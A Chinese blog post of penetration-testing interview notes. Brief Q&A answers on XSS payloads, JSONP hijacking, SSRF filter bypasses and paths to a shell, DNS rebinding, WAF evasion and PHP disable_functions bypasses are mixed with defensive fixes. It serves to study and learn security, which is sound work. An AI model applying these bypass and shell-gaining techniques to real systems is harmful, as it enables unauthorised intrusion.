<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>2022面经总结 | Mengd@</title><meta name="keywords" content="面试"><meta name="author" content="Mengd@"><meta name="copyright" content="Mengd@"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="前言:这里总结一下我在进行面试复习的时候复习的知识点,根据网上各位师傅的面试经验进行问题回答总结,留作记录,每个问题的回答是基于本人情况并且站在自己的角度如何在面试中回答这个问题而写的。 [TOC] 自我介绍:我叫徐俊杰,今年大三,所学习的专业是渗透与测试,是学校CTF战队NYSEC的副队长,经常参加CTF比赛,也取得过一定的成绩.在安全方面除了通过CTF竞赛学到的安全知识外,在实战黑盒测试中:也">
<meta property="og:type" content="article">
<meta property="og:title" content="2022面经总结">
<meta property="og:url" content="https://men9da.cn/2022/04/18/2022%E9%9D%A2%E7%BB%8F%E6%80%BB%E7%BB%93/index.html">
<meta property="og:site_name" content="Mengd@">
<meta property="og:description" content="前言:这里总结一下我在进行面试复习的时候复习的知识点,根据网上各位师傅的面试经验进行问题回答总结,留作记录,每个问题的回答是基于本人情况并且站在自己的角度如何在面试中回答这个问题而写的。 [TOC] 自我介绍:我叫徐俊杰,今年大三,所学习的专业是渗透与测试,是学校CTF战队NYSEC的副队长,经常参加CTF比赛,也取得过一定的成绩.在安全方面除了通过CTF竞赛学到的安全知识外,在实战黑盒测试中:也">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
<meta property="article:published_time" content="2022-04-18T14:19:43.000Z">
<meta property="article:modified_time" content="2022-06-08T12:09:22.826Z">
<meta property="article:author" content="Mengd@">
<meta property="article:tag" content="面试">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="https://s3.ax1x.com/2021/01/15/s0eSiT.png"><link rel="canonical" href="https://men9da.cn/2022/04/18/2022%E9%9D%A2%E7%BB%8F%E6%80%BB%E7%BB%93/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  ClickShowText: {"text":"Mengd@,Flag,CTF,Web,Misc,Pwn,N0p3,Nysec","fontSize":"15px"},
  lightbox: 'fancybox',
  Snackbar: undefined,
  justifiedGallery: {
    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isanchor: false
};

var saveToLocal = {
  set: function setWithExpiry(key, value, ttl) {
    const now = new Date()
    const expiryDay = ttl * 86400000
    const item = {
      value: value,
      expiry: now.getTime() + expiryDay,
    }
    localStorage.setItem(key, JSON.stringify(item))
  },

  get: function getWithExpiry(key) {
    const itemStr = localStorage.getItem(key)

    if (!itemStr) {
      return undefined
    }
    const item = JSON.parse(itemStr)
    const now = new Date()

    if (now.getTime() > item.expiry) {
      localStorage.removeItem(key)
      return undefined
    }
    return item.value
  }
}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-06-08 20:09:22'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(function () {  window.activateDarkMode = function () {
    document.documentElement.setAttribute('data-theme', 'dark')
    if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
    }
  }
  window.activateLightMode = function () {
    document.documentElement.setAttribute('data-theme', 'light')
   if (document.querySelector('meta[name="theme-color"]') !== null) {
      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
    }
  }
  const autoChangeMode = 'false'
  const t = saveToLocal.get('theme')
  if (autoChangeMode === '1') {
    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
    if (t === undefined) {
      if (isLightMode) activateLightMode()
      else if (isDarkMode) activateDarkMode()
      else if (isNotSpecified || hasNoSupport) {
        const now = new Date()
        const hour = now.getHours()
        const isNight = hour <= 6 || hour >= 18
        isNight ? activateDarkMode() : activateLightMode()
      }
      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
        if (saveToLocal.get('theme') === undefined) {
          e.matches ? activateDarkMode() : activateLightMode()
        }
      })
    } else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else if (autoChangeMode === '2') {
    const now = new Date()
    const hour = now.getHours()
    const isNight = hour <= 6 || hour >= 18
    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
    else if (t === 'light') activateLightMode()
    else activateDarkMode()
  } else {
    if (t === 'dark') activateDarkMode()
    else if (t === 'light') activateLightMode()
  }const asideStatus = saveToLocal.get('aside-status')
if (asideStatus !== undefined) {
   if (asideStatus === 'hide') {
     document.documentElement.classList.add('hide-aside')
   } else {
     document.documentElement.classList.remove('hide-aside')
   }
}})()</script><link rel="stylesheet" href="/css/background.css"><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="Mengd@" type="application/atom+xml">
</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://s3.ax1x.com/2021/01/15/s010Z4.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">28</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">35</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Mengd@</a></span><span id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><h1 class="post-title">2022面经总结</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-04-18T14:19:43.000Z" title="发表于 2022-04-18 22:19:43">2022-04-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-06-08T12:09:22.826Z" title="更新于 2022-06-08 20:09:22">2022-06-08</time></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h1><p>这里总结一下我在进行面试复习的时候复习的知识点,根据网上各位师傅的面试经验进行问题回答总结,留作记录,每个问题的回答是基于本人情况并且站在自己的角度如何在面试中回答这个问题而写的。</p>
<p>[TOC]</p>
<h4 id="自我介绍"><a href="#自我介绍" class="headerlink" title="自我介绍:"></a>自我介绍:</h4><p>我叫徐俊杰,今年大三,所学习的专业是渗透与测试,是学校CTF战队NYSEC的副队长,经常参加CTF比赛,也取得过一定的成绩.在安全方面除了通过CTF竞赛学到的安全知识外,在实战黑盒测试中:也有自己提交过SRC,在白盒测试中对开源cms以及快速建站系统等web程序审计并且发现漏洞提交到CNVD漏洞平台有自己的cnvd编号,平时会跟进一些热点漏洞,平时常常写一些安全小工具来为自己所使用</p>
<h4 id="渗透测试流程"><a href="#渗透测试流程" class="headerlink" title="渗透测试流程"></a>渗透测试流程</h4><p>1.明确目标</p>
<p>2.分析风险,获取授权</p>
<p>3.信息搜集</p>
<p>4.漏洞探测</p>
<p>5.漏洞验证</p>
<p>6.信息分析</p>
<h4 id="什么是泛解析-在处理子域名爆破时泛解析应该如何处理"><a href="#什么是泛解析-在处理子域名爆破时泛解析应该如何处理" class="headerlink" title="什么是泛解析,在处理子域名爆破时泛解析应该如何处理?"></a>什么是泛解析,在处理子域名爆破时泛解析应该如何处理?</h4><p>泛解析是指当我使用通配符把*.abc.com解析到1.1.1.1这个ip上时,用户访问xxx.abc.com都会被解析到ip:1.1.1.1上面,这使得域名可以无限支持子域,但是在我们进行子域名爆破的时候就会出现问题,因为任何子域名都会被解析到1.1.1.1上去,如何解决呢?通过解析一个不可能存在的域名(比如解析一个MD5加密后的值拼接的子域名),如果仍然解析成功证明该域名存在泛解析</p>
<h4 id="protobuf相关"><a href="#protobuf相关" class="headerlink" title="protobuf相关"></a>protobuf相关</h4><p>protobuf是谷歌提供的一种数据序列化协议可跨平台跨语言，他很好的处理了反序列化漏洞的问题，因为protobuf在IDL中定义了package的范围</p>
<h4 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h4><p>fastjson，序列化过程将java对象转换为json字符串</p>
<p>抓包构造json请求包，通过报错信息判断是否为fastjson</p>
<p>fastjson组件在调用JSON.prase的时候通过@type字段来指定JSON还原什么样的对象（TemplatesImpl，JdbcRowSetImpl(jndi注入)），就会进行反序列化生成对象，最后通过控制lookup参数造成JNDI注入，在进行生成对象的时候会给属性赋值</p>
<h4 id="phpinfo关注的信息"><a href="#phpinfo关注的信息" class="headerlink" title="phpinfo关注的信息"></a>phpinfo关注的信息</h4><p>关注session的临时文件夹路径信息(可存在文件包含利用)</p>
<p>关注php版本,对应漏洞只有对应php版本可以触发</p>
<p>通过phpinfo可以暴露对应站点使用的服务如redis,等服务</p>
<p>phpinfo可以泄露真实ip</p>
<p>phpinfo查看支持协议,如支持gopher协议就能配合ssrf漏洞进行利用</p>
<h4 id="说一个自己感觉不错的漏洞"><a href="#说一个自己感觉不错的漏洞" class="headerlink" title="说一个自己感觉不错的漏洞"></a>说一个自己感觉不错的漏洞</h4><p>看自己跟过那些洞,先说挖到的CNVD或者一些开源cms,思路开放,逻辑较为简单比较好说</p>
<p>然后说thinkphp反序列化链</p>
<p>然后说thinkphp任意类调用漏洞</p>
<p>然后说最近看的log4j,log4j相对简单且能带着说一下rmi和java的远程调用漏洞</p>
<h4 id="输出到href的XSS如何防御"><a href="#输出到href的XSS如何防御" class="headerlink" title="输出到href的XSS如何防御"></a>输出到href的XSS如何防御</h4><p>针对href属性的数据特点进行防御,规定数据只以http/https开头,过滤完成后在进行htmlspecialchars函数处理</p>
<h4 id="SameSite如何防御CSRF攻击"><a href="#SameSite如何防御CSRF攻击" class="headerlink" title="SameSite如何防御CSRF攻击?"></a>SameSite如何防御CSRF攻击?</h4><p>SameSite通过限制只能同域能访问cookie从而防御CSRF攻击</p>
<h4 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h4><p>同源策略是浏览器的一种安全机制,同源策略的存在是为了限制两个网站间的数据隔离,使得A网站不能读取B网站的资源</p>
<p><strong>同源指的是同协议,同域名,同端口</strong></p>
<h4 id="Jsonp"><a href="#Jsonp" class="headerlink" title="Jsonp"></a>Jsonp</h4><p>jsonp是一种跨域解决方案,通过将回调函数发送给服务器,服务器返回json参数,是CSRF漏洞的一种,通过诱导用户点击存在jsonp劫持的页面,将执行恶意页面的代码携带用户的cookie去请求数据,并且触发恶意html页面的回调函数将数据存储到黑客服务器,然后再进行重定向到正常页面用户无法发觉</p>
<p>jsonp劫持可能存在的地方</p>
<p>1.referer过滤不严格</p>
<p>2.空referer</p>
<p>3.token可重复利用</p>
<p>4.conten-type编码不符合标准(宽字节注入)</p>
<p>5.未严格过滤</p>
<p><strong>实现原理</strong></p>
<p>动态创建script标签,利用script的src不受同源策略约束来跨域获取数据</p>
<h4 id="Jsonp防御"><a href="#Jsonp防御" class="headerlink" title="Jsonp防御"></a>Jsonp防御</h4><p>1.限制referer</p>
<p>2.生成随机token</p>
<p>3.限制回调函数的长度以及名称(如不限制可造成XSS),JSON服务端设置Content-Type就能防御XSS;</p>
<p><strong>referer验证绕过</strong>/空referer:</p>
<p><code>data URI</code>不会发送referer头,可以绕过referer检测</p>
<p>iframe标签+js为协议</p>
<p>meta标签</p>
<p>HTTPS向http发起请求</p>
<h4 id="CSRF更好的防御方式有哪些-具体如何实现"><a href="#CSRF更好的防御方式有哪些-具体如何实现" class="headerlink" title="CSRF更好的防御方式有哪些?具体如何实现?"></a>CSRF更好的防御方式有哪些?具体如何实现?</h4><p>通过成熟的csrfToken进行防御</p>
<p>限制refer(可被篡改)</p>
<h4 id="JSON格式的csrf如何防御"><a href="#JSON格式的csrf如何防御" class="headerlink" title="JSON格式的csrf如何防御"></a>JSON格式的csrf如何防御</h4><p>用户操作验证(验证码)</p>
<p>来源请求验证(验证referer)</p>
<p>表单token验证(csrftoken)</p>
<h4 id="浏览器解析顺序"><a href="#浏览器解析顺序" class="headerlink" title="浏览器解析顺序"></a>浏览器解析顺序</h4><p>1.网络部分</p>
<p>用户发起网络请求包-&gt;服务器对网络请求包进行分析,资源定位-&gt;后端处理后将处理后的数据返回给前端</p>
<p>2.浏览器处理部分</p>
<p>浏览器接收到响应数据后会对HTML进行解析并构建DOM树,CSS被CSS解析器解析为CSS样式表</p>
<p>当解析器遇到&lt;script&gt;标签的时候对HTML的解析将会暂停,由Javascript引擎进行分析,&lt;script&gt;标签被解析完成后会继续往下执行html标签,所以将js放在dom生成的最后可以在dom完全加载后对dom进行操作</p>
<h4 id="浏览器解码顺序"><a href="#浏览器解码顺序" class="headerlink" title="浏览器解码顺序"></a>浏览器解码顺序</h4><p>0.浏览器解码主要三个过程,html解析,css解析,js解析,url解析</p>
<p>1.url解码:服务器接受用户的url请求,对%开头的数据进行url解码</p>
<p>2.HTML解析器:通过&lt;&gt;符号来开启是否解析为标签(在这个过程中就会进行html的解码),HTML编码只会在数据段(标签外部和标签的text段)</p>
<p>3.解码顺序:HTML解码-&gt;JS解码-&gt;URL解码</p>
<p><strong>浏览器自解码</strong></p>
<p>例子:()为&amp;#40,&amp;#41,浏览器认识,解码</p>
<p>1.HTML自解码:html编码方式有进制编码和实体编码,比如img标签中的onerror,将其后面的值进行10/16进制编码/实体编码(将保留字符&amp;&lt;&gt;”=&gt;”解析为了特殊的形式)/后浏览器解析的时候会自动进行解码,但是onerror不能被编码,因为是控制字符,编码后将会被识别为纯文本,不会被解析成DOM</p>
<p>2.JS自解码,还是以img中的onerror为例,可以将其内容进行Unicode,十进制/十六进制编码,<strong>在JS中单引号,双引号,括号属于控制字符,编码后无法解析,所以防御的时候只用将这些控制字符编码即可</strong>,浏览器先进行HTML自解码</p>
<p>3,css自解码</p>
<p>反斜杠+1-6位十六进制数字组成,HTML解析器优先于CSS解析器</p>
<p>4.URL自解码</p>
<p>在js中的href标签会先进行url解码,也就是说加入在a标签中存在href字段时,解码顺序就是HTML解码-&gt;href解码-&gt;js解码-&gt;href解码</p>
<h4 id="为什么html实体编码能够防范XSS漏洞"><a href="#为什么html实体编码能够防范XSS漏洞" class="headerlink" title="为什么html实体编码能够防范XSS漏洞?"></a>为什么html实体编码能够防范XSS漏洞?</h4><p>1.涉及到浏览器解码顺序</p>
<p>因为浏览器的解码顺序规则,导致html编码只能在标签外部或者标签内部的text段被解析,因此形如下面的xss代码就不会执行,因为html实体编码位于标签内部,不会进行html实体编码</p>
<script>alert&#40;'1')</script>

<h4 id="XSS-弹-alert-有那些方法"><a href="#XSS-弹-alert-有那些方法" class="headerlink" title="XSS 弹 alert 有那些方法"></a>XSS 弹 alert 有那些方法</h4><p>1.直接stript标签直接弹</p>
<p>2.javascript:弹</p>
<p>3.&lt;img src=x onerror=alert(1)&gt;图片标签onerror弹</p>
<p>4.unicode弹</p>
<p>5.top对象调用弹</p>
<h4 id="XSS-DOM-反射区别-自动化防御"><a href="#XSS-DOM-反射区别-自动化防御" class="headerlink" title="XSS,DOM,反射区别,自动化防御"></a>XSS,DOM,反射区别,自动化防御</h4><p>反射型:用户通过输入恶意xss代码,经过服务器后返回给浏览器进行触发</p>
<p>DOM型:不通过服务器,直接由网页本身渲染触发</p>
<p>防御:对输出进行htmlspecialchars进行实体编码,注意此函数默认不编码单引号需要进行设置</p>
<p>对输入进行过滤,比如在href处就必须指定以http/https开头</p>
<h4 id="XSS出现的根本原因"><a href="#XSS出现的根本原因" class="headerlink" title="XSS出现的根本原因"></a>XSS出现的根本原因</h4><p>用户的数据被当作HTML代码的一部分被浏览器解析执行了,通过拼接,插入,截断的方式更改原有的语义,产生了新的语义</p>
<h4 id="XSS防御措施"><a href="#XSS防御措施" class="headerlink" title="XSS防御措施"></a>XSS防御措施</h4><p>1.html实体编码</p>
<p>2.CSP安全策略,可以禁止加载其他域的文件,禁止向第三方提交信息,禁止执行未授权脚本,通过report-uri可以及时发现请求的资源不被允许时是往那个地方请求的,快速发现xss漏洞</p>
<p>3.httpOnly属性禁止盗取cookie</p>
<h4 id="MXSS-突变xss"><a href="#MXSS-突变xss" class="headerlink" title="MXSS(突变xss)"></a>MXSS(突变xss)</h4><p>1.在一些场景中,经过服务器过滤的html文本在被解析的时候真实的dom结构和预期dom结构存在差异导致以外执行XSS</p>
<p>2.常见的如反引号打破边界属性,未知元素xmlns属性(可以在html中定义这些未知标签的xmlns属性),这样在服务器检测的时候确实通过了检测,但是被浏览器渲染你的时候由于环境发生变化,和服务器认知不同,产生了解析不同导致xss</p>
<p>3.Listing标签,css属性名转义\22转译为”</p>
<h4 id="伪随机数"><a href="#伪随机数" class="headerlink" title="伪随机数"></a>伪随机数</h4><p>1.通过信息泄露,源码泄露,文件读取等方法拿到种子,即可获取随机数规律</p>
<h4 id="PythonSSTI相关说辞"><a href="#PythonSSTI相关说辞" class="headerlink" title="PythonSSTI相关说辞"></a>PythonSSTI相关说辞</h4><p>模板注入,过滤绕过看对应总结文章</p>
<h4 id="一个单位的一级域名可能不止一个，怎么收集某个单位的所有域名，注意不是子域名"><a href="#一个单位的一级域名可能不止一个，怎么收集某个单位的所有域名，注意不是子域名" class="headerlink" title="一个单位的一级域名可能不止一个，怎么收集某个单位的所有域名，注意不是子域名"></a>一个单位的一级域名可能不止一个，怎么收集某个单位的所有域名，注意不是子域名</h4><p>通过网络空间搜索引擎进行资产的搜集</p>
<p>通过企查查,小蓝本等网站查询</p>
<h4 id="sqlmap高级使用-过滤-条件"><a href="#sqlmap高级使用-过滤-条件" class="headerlink" title="sqlmap高级使用(过滤,条件)"></a>sqlmap高级使用(过滤,条件)</h4><h4 id="SSRF-绕过"><a href="#SSRF-绕过" class="headerlink" title="SSRF 绕过"></a>SSRF 绕过</h4><p>用@绕过,<a target="_blank" rel="noopener" href="http://www.baidu.com@10.10.10.10/">www.baidu.com@10.10.10.10</a></p>
<p>用ip地址转换成进制绕过8进制0300.0250.0.1 16进制0XC0.0XA8.0.1 10进制:3232235521 16进制0XC0A80001</p>
<p>10.0.0.1可以写成10.1</p>
<p>301,302跳转绕过,会继续请求跳转后的url</p>
<p>短网址绕过</p>
<p>封闭式字母数字Enclosed alphanumerics</p>
<p>利用dns解析服务想xip.io解析</p>
<p>句号绕过</p>
<p>dns重绑定绕过</p>
<p><strong>畸形ip</strong></p>
<p>封闭式字母数字Enclosed alphanumerics</p>
<p>用ip地址转换成进制绕过8进制0300.0250.0.1 16进制0XC0.0XA8.0.1 10进制:3232235521 16进制0XC0A80001</p>
<p>句号绕过</p>
<p>后端对URL解析不当造成,根据解析规则构造payload绕过</p>
<h4 id="DNS重绑定原理"><a href="#DNS重绑定原理" class="headerlink" title="DNS重绑定原理"></a>DNS重绑定原理</h4><p>A记录域名-&gt;IP</p>
<p>CNAME记录-&gt;域名别名</p>
<p>NS记录：域名服务器</p>
<p>1.利用时间差，在域名服务商处设置TTL值为0，后端解析host为ip，确认无误后执行curl发起第二次请求，此时TTL值为0，再次请求会重新解析，利用时间差更换记录即可</p>
<p>TTL为0失效，DNS服务器：114.114.114.114不按照标准协议，8.8.8.8可以利用</p>
<p>2.设置多条A记录，随机到内网地址</p>
<p>3.自建DNS服务器</p>
<h4 id="短网址原理"><a href="#短网址原理" class="headerlink" title="短网址原理"></a>短网址原理</h4><p><a target="_blank" rel="noopener" href="http://aip/asdwsad32">http://aip/asdwsad32</a></p>
<p>asdwsad32则是对应网址编号，查询到对应ip地址，301跳转</p>
<p>301永久</p>
<p>302临时</p>
<h4 id="SSRF伪协议合集"><a href="#SSRF伪协议合集" class="headerlink" title="SSRF伪协议合集"></a>SSRF伪协议合集</h4><p>file://文件读取</p>
<p>gopher://攻击内网应用</p>
<p>dict://端口探测,泄露安装软件版本信息</p>
<p>http://端口探测</p>
<h4 id="SSRF利用-最大程度利用-进内网-拿shell"><a href="#SSRF利用-最大程度利用-进内网-拿shell" class="headerlink" title="SSRF利用,最大程度利用,进内网,拿shell"></a>SSRF利用,最大程度利用,进内网,拿shell</h4><p>1.如果使用system(curl,””)拼接,可以直接getshell</p>
<p>2.file:///读文件,读数据库配置文件,开启远程链接直接连,读源码,找漏洞</p>
<p>3.dict://测端口,redis,等服务</p>
<p>3.gopher://发post,get包,打内网应用,打redis</p>
<h4 id="SSRF到getshell"><a href="#SSRF到getshell" class="headerlink" title="SSRF到getshell"></a>SSRF到getshell</h4><p>redis未授权,mysql未授权,弱口令,redis写文件,mysql写shell,intofile,日志shell,udf提权等</p>
<h4 id="SSRF怎么修复"><a href="#SSRF怎么修复" class="headerlink" title="SSRF怎么修复"></a>SSRF怎么修复</h4><p><strong>代码层面</strong></p>
<p>1.设置白名单,首先针对host进行校验,防止被其他格式的ip地址绕过如8进制/16进制/10进制整数格式绕过,在根据白名单放行二级域名</p>
<p>2.限制访问协议只能为http/https,检测是否存在特殊字符,设置setInstanceFollowRedirects为false禁止302跳转</p>
<p>3.解析url域名对应的ip地址,首先经过过滤后确认ip地址不是内网地址,然后访问对应资源,可以防范DNS重绑定,**此修复方案可能会出现的问题:**请求某些资源时会对host进行检查判断host是不是域名,如果是就会拒绝</p>
<p>**修复:**使用setRequestProperty设置host头为域名,对应代码处也需要做一定的修改,JAVA中调用System.setProperty(“<a target="_blank" rel="noopener" href="http://sun.net/">sun.net</a>.http.allowRestrictedHeaders”, “true”)</p>
<p><strong>服务器层面</strong></p>
<p>1.设置一个代理服务器专门用来访问外部资源,此服务器与内网隔离,就算出现SSRF威胁也不会危害到主服务器</p>
<h4 id="python-的装饰器，迭代器，yield"><a href="#python-的装饰器，迭代器，yield" class="headerlink" title="python 的装饰器，迭代器，yield"></a>python 的装饰器，迭代器，yield</h4><h4 id="RASP防御-结合sql"><a href="#RASP防御-结合sql" class="headerlink" title="RASP防御,结合sql"></a>RASP防御,结合sql</h4><p>运行时保护</p>
<h4 id="PHP底层如何判断变量类型"><a href="#PHP底层如何判断变量类型" class="headerlink" title="PHP底层如何判断变量类型?"></a>PHP底层如何判断变量类型?</h4><p>PHP通过一个结构体存储所有类型的变量,这个结构体表示一个php变量,这个结构体中有一个zvalue字段,存放的是一个指针,在_zval_value结构体中存放着不同的数据类型,当zval字段指向这个结构体中的不同数据类型,这个php变量结构体就是这样的一个数据类型</p>
<h4 id="绕过WAF常用方式"><a href="#绕过WAF常用方式" class="headerlink" title="绕过WAF常用方式?"></a>绕过WAF常用方式?</h4><p>1.发送很大的请求包使得WAF处理超时</p>
<p>2.Mutilpart变量绕过,有些WAF在存在filename属性的时候会不进行检测</p>
<p>3.构造畸形请求包,破坏一些参数使得waf无法正常识别,但是中间件会兼容识别</p>
<p>4.编码绕过</p>
<p>5.重复变量绕过</p>
<p>6.参数污染,相同参数,多参数</p>
<p>7.分段传输绕过需要在请求头中添加Transfer-Encoding:chunked字段</p>
<p>8.SSRF绕过</p>
<p>9.DNS解析绕过,云waf,cdn,通过网络空间搜索引擎去查找真实IP地址</p>
<h4 id="富文本"><a href="#富文本" class="headerlink" title="富文本"></a>富文本</h4><p>一大段html,需要引用一些html样式</p>
<h4 id="富文本XSS和非富文本XSS修复方式区别"><a href="#富文本XSS和非富文本XSS修复方式区别" class="headerlink" title="富文本XSS和非富文本XSS修复方式区别?"></a>富文本XSS和非富文本XSS修复方式区别?</h4><p>1.非富文本可以使用html实体编码,关键字过滤,href处检测http/https开头,后白名单过滤</p>
<p>2.富文本使用白名单,只允许白名单中的标签和属性,可以使用预防xss的一些组件来设置白名单(npm instal xss)</p>
<h4 id="websocket链接过程"><a href="#websocket链接过程" class="headerlink" title="websocket链接过程"></a>websocket链接过程</h4><p>websocket基于TCP协议,首先客户端与服务端建立TCP链接,然后发起HTTP请求,在HTTP请求中设置connection字段为upgrade表示告诉服务器我这请求将升级为websocket,对应的upgrade字段为websocket,服务端接受了请求,建立websocket链接,然后开始传输数据</p>
<h4 id="零信任"><a href="#零信任" class="headerlink" title="零信任"></a>零信任</h4><p>永不信任-始终验证:不存在受信任的网络,每次操作都必须经过身份验证才能被执行</p>
<h4 id="入侵检测-HIDS-NIDS"><a href="#入侵检测-HIDS-NIDS" class="headerlink" title="入侵检测:HIDS,NIDS"></a>入侵检测:HIDS,NIDS</h4><p>HIDS:可以动态检查网络数据包,检测程序访问的内部资源以及各种存储信息的操作,核对是否符合预期(将文件状态进行记录,放入安全数据库(校验码数据库))</p>
<p>NIDS:网络入侵检测,从TCP/IP消息流中识别出潜在的攻击行为</p>
<h4 id="ddos类型-如何防御"><a href="#ddos类型-如何防御" class="headerlink" title="ddos类型,如何防御?"></a>ddos类型,如何防御?</h4><p>1.TCP洪水(SYN),TCP协议缺陷,大量伪造的IP地址发送TCP链接的第一个包,服务器需要对其进行回复,且不会得到回复,造成资源浪费,正常服务堵塞</p>
<p>2.cc攻击,发送大量HTTP请求以耗尽资源</p>
<p>3.DRDOS,构造带有被害ip地址的数据包给攻击主机(DNS,NTP服务等),利用他们的回复包形成ddos攻击</p>
<p>防御措施:</p>
<p>1.硬件防火墙</p>
<p>2.加大带宽</p>
<p>3.负载均衡</p>
<p>4.CDN加速</p>
<h4 id="如何判断用户是否为正常用户"><a href="#如何判断用户是否为正常用户" class="headerlink" title="如何判断用户是否为正常用户"></a>如何判断用户是否为正常用户</h4><p>1.判断是否经常对登录界面进行多账号/密码登陆尝试</p>
<p>2.判断是否经常尝试请求一些敏感页面</p>
<p>3.判断该用户所发出的请求是否包含一些敏感字段,特殊符号</p>
<p>4.判断其所用的请求头</p>
<h4 id="企业内部如何做隐私保密"><a href="#企业内部如何做隐私保密" class="headerlink" title="企业内部如何做隐私保密"></a>企业内部如何做隐私保密</h4><p>1.使用加密软件对电脑中的数据进行加密,使其脱离环境即便被盗取也无法被解密</p>
<p>2.对企业所有出网流量做全流量监控,探测敏感数据</p>
<h4 id="php-disablefunction绕过"><a href="#php-disablefunction绕过" class="headerlink" title="php disablefunction绕过"></a>php disablefunction绕过</h4><p>1.寻找为未禁用的函数如popen,proc_open,pcntl_exec</p>
<p>2.LD_PRELOAD劫持系统函数</p>
<p>3.mod-cgi:配置.htaccess文件可以允许一个目录执行cgi程序并指定后缀,从而执行对应的代码,不受disable_function限制</p>
<p>4.php溢出</p>
<h4 id="java-php-python反序列化产生原因，如何防御"><a href="#java-php-python反序列化产生原因，如何防御" class="headerlink" title="java/php/python反序列化产生原因，如何防御"></a>java/php/python反序列化产生原因，如何防御</h4><p>1.java是因为java中在反序列化一个对象的过程中会调用其静态代码块/构造函数内的代码,并且如果被反序列化的对象重写了readObject方法,那么也会执行readObject方法当中的代码</p>
<p>2.php是因为php在反序列化时在特定条件下触发魔法函数,如destruct,constract,toString,sleep(被序列化之前执行),wakeup</p>
<p>3.python时候由于pickle库在进行反序列化时,在反序列化结束后会自动调用reduce魔术方法中的代码</p>
<p>几乎所有的漏洞都发生在反序列化这个过程中,那么就需要控制反序列化的数据来源,不让外部能有控制反序列化数据的机会即可</p>
